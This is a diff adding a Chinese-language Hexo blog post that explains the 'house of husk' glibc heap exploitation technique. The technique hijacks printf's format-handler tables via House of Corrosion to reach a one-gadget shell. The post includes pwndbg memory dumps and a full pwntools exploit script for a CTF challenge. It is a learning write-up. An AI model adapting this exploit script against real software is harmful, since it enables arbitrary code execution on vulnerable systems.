@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="house of husk针对printf函数的攻击，主要利用printf函数的虚表，通过篡改虚表指针执行ogg。 原理printf函数在执行过程中会根据第一个格式化字符”%X”在虚表__printf_arginfo_table和__printf_function_table寻找函数指针进行执行，具体寻找过程就是__printf_arginfo_table[‘X’],找到这个指针，然后跳到这执行，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of husk">
+<meta property="og:url" content="http://example.com/2022/02/02/house-of-husk/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="house of husk针对printf函数的攻击，主要利用printf函数的虚表，通过篡改虚表指针执行ogg。 原理printf函数在执行过程中会根据第一个格式化字符”%X”在虚表__printf_arginfo_table和__printf_function_table寻找函数指针进行执行，具体寻找过程就是__printf_arginfo_table[‘X’],找到这个指针，然后跳到这执行，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-02T12:23:19.000Z">
+<meta property="article:modified_time" content="2022-02-02T12:25:39.423Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/02/02/house-of-husk/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>house of husk | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/house-of-husk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          house of husk
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-02 20:23:19 / 修改时间：20:25:39" itemprop="dateCreated datePublished" datetime="2022-02-02T20:23:19+08:00">2022-02-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><p>针对printf函数的攻击，主要利用printf函数的虚表，通过篡改虚表指针执行ogg。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>printf函数在执行过程中会根据第一个格式化字符”%X”在虚表__printf_arginfo_table和__printf_function_table寻找函数指针进行执行，具体寻找过程就是__printf_arginfo_table[‘X’],找到这个指针，然后跳到这执行，只要把这里的指针改成ogg就可以getshell,修改这里的指针大致分为两种办法，一种是任一地址写，直接写这两个虚表对应地址的指针，第二个是通过堆伪造这两个虚表，第一个很好理解，主要讲一下第二个。</p>
+<h2 id="伪造虚表"><a href="#伪造虚表" class="headerlink" title="伪造虚表"></a>伪造虚表</h2><p>__printf_arginfo_table和__printf_function_table这两个虚表地址储存在main_arena下面的地址中，而且和main_arena首地址很接近，在我这个glibc版本下只相差0xc30，这是伪造的第一步</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dce870 &lt;__printf_arginfo_table&gt;:	0x000000000060bb90	0x0000000000000000</span><br><span class="line">0x7ffff7dce880 &lt;buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce890 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8a0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8b0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8c0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8d0 &lt;ttyname_buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8e0 &lt;getmntent_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8f0 &lt;qfcvt_bufptr&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce900 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx &amp;main_arena</span></span><br><span class="line">0x7ffff7dcdc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x7ffff7dcdc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>要想执行这两个虚表储存的函数指针，得先找见这两个虚表地址才行，然后通过虚表地址加上偏移量得到函数地址跳进去执行，这两个虚表地址储存在固定的位置，所以只要能覆盖这两个虚表地址成堆地址，然后再相应偏移量处添上ogg就可以getshell了吗不是。</p>
+<p>现在关键的就是覆盖虚表地址，网上的普遍做法是利用House of Corrosion技术。这个技术和fastbin息息相关。</p>
+<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3><p>众所周知，fastbin链表的大小是0x20到0x80之间，但其实最大值并不是固定的，而是global_max_fast中的值决定的，一般是0x80,所以fastbin的最大值就是0x80</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>所以可以通过改变这个地方的值让fasbin能接受的最大值变大，一般是利用unsortbinattack，也可以直接ufa来完成。</p>
+<p>还有一个知识点就是从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针,glibc预留了十个指针来存放fastbin的头指针，比如free的chunk是0x50,那储存这个堆地址的地址是main_arena+8+(0x50-0x20)/0x10*8也就是在main_arena+32处存放堆地址，简而言之就是main_arena+8加上偏移量处存放堆地址，这个偏移量和size正相关，当通过修改global_max_fast的值让可free的chunk的size是任意值，那我们就可以向main_arena+8后的任意一个地址填上堆地址了。</p>
+<p>很有意思的攻击手段，那也就是说可以向__printf_arginfo_table和__printf_function_table中填入堆地址了，到这里攻击思路就闭环。</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>先修改global_max_fast的值，然后申请两个堆，堆的大小通过下面的公式算出，各伪造一个虚表，然后再伪造printf_arginfo_table的堆上写好ogg,然后都free掉修改虚表地址，最后调用printf完成攻击</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.不同版本main_arena+8到__printf_arginfo_table和__printf_function_table的偏移量不同，根据偏移量确定size的值完成堆地址覆盖。</p>
+<p>​               chunk_size=地址差值*2+0x20</p>
+<p>2.实施前提：</p>
+<p>​            1.有至少一次ufa完成global_max_fast的修改                                                                                                                                                                              </p>
+<p>​            2.有prinf函数且第二个参数可控</p>
+<p>例题 HWS pwn1</p>
+<p>感觉这道题作为house of husk的入门题挺不错的，简直就是专门为这个利用而生,刚好有一次unsortbinatack,刚好能申请两个合法的堆，刚好有很多printf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">fastbinY=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a big box, what size?\n&#x27;</span>)</span><br><span class="line">    print_arginfo_table=<span class="number">0x3ec870</span></span><br><span class="line">    printf_function_table=<span class="number">0x3f0738</span></span><br><span class="line">    chunk_size1=(print_arginfo_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    chunk_size2=(printf_function_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size1))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a bigger box, what size?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size2))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Do you want to rename?(y/n)\n&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now your name is:&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input your new name!\n&#x27;</span>)</span><br><span class="line">    global_max_fast_addr=libc_base+<span class="number">0x3ed940</span></span><br><span class="line">    sh.send(p64(<span class="number">0</span>)+p64(global_max_fast_addr-<span class="number">0x10</span>))</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;box?(1:big/2:bigger)\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let\&#x27;s edit, &#x27;</span>)</span><br><span class="line">    ogg=libc_base+<span class="number">0x4f432</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ogg)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">8</span>*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)-<span class="number">2</span>) + p64(ogg)*<span class="number">2</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/22/HGAME/" rel="prev" title="HGAME">
+      <i class="fa fa-chevron-left"></i> HGAME
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-husk"><span class="nav-number">1.</span> <span class="nav-text">house of husk</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E8%99%9A%E8%A1%A8"><span class="nav-number">1.2.</span> <span class="nav-text">伪造虚表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Corrosion"><span class="nav-number">1.2.1.</span> <span class="nav-text">House of Corrosion</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">攻击思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
